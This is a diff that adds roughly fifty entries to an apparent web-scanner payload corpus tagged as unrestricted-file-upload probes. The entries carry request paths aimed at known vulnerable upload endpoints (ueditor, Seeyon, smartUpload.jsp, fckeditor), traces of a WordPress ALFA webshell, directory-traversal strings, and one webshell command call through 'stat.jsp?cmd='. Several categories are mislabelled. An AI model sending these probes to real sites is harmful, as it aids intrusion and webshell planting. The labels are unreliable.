@@ -108,5 +108,555 @@
       "expected_status_code": 200,
       "success_regex": ""
     }
+  },
+  {
+    "payload_id": "OWP-244963",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/usr/lib/pythonX.Y/site-packages/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-244964",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/usr/local/lib/pythonX.Y/dist-packages/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-244965",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/home/$USER",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393367",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/dev/null",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-393368",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/dev/null/foo",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-405821",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/jquery-file-upload/server/php/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-406886",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/ueditor/php/upload/{{filename}}\\\\.php",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-407058",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/html/2word?url={{file}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-407236",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/ftb.imagegallery.aspx",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-407241",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/stat.jsp?cmd=chcp+437+%7c+dir",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-407370",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/ueditor/net/controller.ashx?action=catchimage&encode=utf-8",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-407418",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/seeyon/thirdpartyController.do.css/..;/ajax.do",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-407455",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/defaultroot/officeserverservlet",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-407456",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/defaultroot/extension/smartUpload.jsp?path=information&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&fileMaxNum=0&fileType=gif,jpg,bmp,jsp,png&fileMinWidth=0&fileMinHeight=0&fileMaxWidth=0&fileMaxHeight=0",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-407475",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/wp-includes/ALFA_DATA/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-407476",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "WordPress",
+    "injection_point": "path_parameter",
+    "payload_string": "/wp-content/uploads/alm_templates/ALFA_DATA/alfacgiapi/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-407477",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/ALFA_DATA/alfacgiapi/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-407478",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/cgi-bin/ALFA_DATA/alfacgiapi/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-407479",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "WordPress",
+    "injection_point": "path_parameter",
+    "payload_string": "/wp-content/plugins/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-407553",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "WordPress",
+    "injection_point": "path_parameter",
+    "payload_string": "/wp-content/themes/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-407554",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/wp-includes/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-407564",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "WordPress",
+    "injection_point": "path_parameter",
+    "payload_string": "/wp-content/uploads/tmm_db_migrate/tmm_db_migrate.zip",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-407608",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "WordPress",
+    "injection_point": "path_parameter",
+    "payload_string": "/wp-content/uploads/mc4wp-debug.log",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-407609",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "WordPress",
+    "injection_point": "path_parameter",
+    "payload_string": "/wp-content/uploads/mc4wp-debug-log.php",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-407610",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "WordPress",
+    "injection_point": "path_parameter",
+    "payload_string": "/wp-content/uploads/mailchimp-for-wp/debug-log.php",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-407611",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "WordPress",
+    "injection_point": "path_parameter",
+    "payload_string": "/wp-content/uploads/sites/1/mc4wp-debug-log.php",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-407612",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "WordPress",
+    "injection_point": "path_parameter",
+    "payload_string": "/wp-content/uploads/sites/1/mailchimp-for-wp/debug-log.php",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-407648",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "WordPress",
+    "injection_point": "path_parameter",
+    "payload_string": "/wp-content/uploads/data.txt",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-407657",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "WordPress",
+    "injection_point": "path_parameter",
+    "payload_string": "/wp-content/uploads/pdf-invoices/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-407658",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "WordPress",
+    "injection_point": "path_parameter",
+    "payload_string": "/wp-content/uploads/wpdm-cache/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-408075",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/api/upload?action=filemgr&dirPath=~/App_Data/files/../../Custom/Themes/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-408083",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/olt/Login.do/../../olt/UploadFileUpload.do",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-408092",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "../../../members/uploads/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-408136",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "../uploads/avatar_suntzu",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-408147",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "../../upload/avatar_",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-408148",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "../../upload/photo_",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-408183",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/back/upload_img.php?upload=1&ok_update=yes&path=./../img_quiz/zaz.php",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-408186",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "../upload/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-408240",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/admin/assets/UploadForm HTTP/1.1\\r\\n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-408241",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/upload.php?logout=shell.php HTTP/1.1\\r\\n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-408260",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/javascript/editors/fckeditor/editor/filemanager/upload/phpws/upload.php?local=.htaccess HTTP/1.1\\r\\n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-408269",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "../../../../../uploads/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-408273",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "../uploads/$file",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-408284",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "../../uploads/candidate_application_form/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-408322",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "../../admin/inc/upload",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-408323",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "WordPress",
+    "injection_point": "path_parameter",
+    "payload_string": "../wp-content/plugins/baggage_shipping/upload/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-408342",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "../../uploads/users/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-408365",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/eskuel/help.php?action=../../../images/avatars/upload/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-408385",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "../../includes/upload/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-408399",
+    "vulnerability_category": "Injection (Unrestricted File Upload)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/upload.php?upload_range=1 HTTP/1.0\\r\\n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
   }
 ]
